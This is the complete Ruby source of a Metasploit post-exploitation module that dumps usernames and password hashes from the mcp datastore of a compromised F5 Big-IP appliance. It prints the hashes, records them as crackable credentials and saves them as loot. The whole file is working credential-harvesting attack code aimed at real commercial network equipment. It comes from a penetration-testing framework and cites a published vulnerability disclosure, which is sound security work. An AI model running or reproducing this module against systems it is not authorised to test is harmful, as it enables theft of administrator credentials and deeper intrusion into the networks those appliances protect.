##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Linux::System
  include Msf::Post::Linux::F5Mcp

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'F5 Big-IP Gather Users',
        'Description' => %q{
          This module gathers usernames and password hashes from F5's mcp
          datastore, which is accessed via /var/run/mcp.

          Adapted from:  https://github.com/rbowes-r7/refreshing-mcp-tool/blob/main/mcp-getloot.rb
        },
        'License' => MSF_LICENSE,
        'Author' => ['Ron Bowes'],
        'Platform' => ['linux'],
        'SessionTypes' => ['shell', 'meterpreter'],
        'References' => [
          ['URL', 'https://github.com/rbowes-r7/refreshing-mcp-tool'], # Original PoC
          ['URL', 'https://www.rapid7.com/blog/post/2022/11/16/cve-2022-41622-and-cve-2022-41800-fixed-f5-big-ip-and-icontrol-rest-vulnerabilities-and-exposures/'],
          ['URL', 'https://support.f5.com/csp/article/K97843387'],
        ],
        'DisclosureDate' => '2022-11-16',
        'Targets' => [[ 'Auto', {} ]],
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )
  end

  def run
    users = mcp_simple_query('userdb_entry')

    unless users
      print_error('Failed to query users')
      return
    end

    loot = []
    users.each do |u|
      vprint_good("#{u['userdb_entry_name']} / #{u['userdb_entry_passwd']}")

      create_credential(
        jtr_format: Metasploit::Framework::Hashes.identify_hash(u['userdb_entry_passwd']),
        origin_type: :session,
        post_reference_name: refname,
        private_type: :nonreplayable_hash,
        private_data: u['userdb_entry_passwd'],
        session_id: session_db_id,
        username: u['userdb_entry_name'],
        workspace_id: myworkspace_id
      )
      loot << "#{u['userdb_entry_name']}:#{u['userdb_entry_passwd']}"
    end

    print_good("Passwords stored in #{store_loot('f5.passwords', 'text/plain', session, loot.join("\n"), nil, 'F5 Password Hashes')}")
  end
end
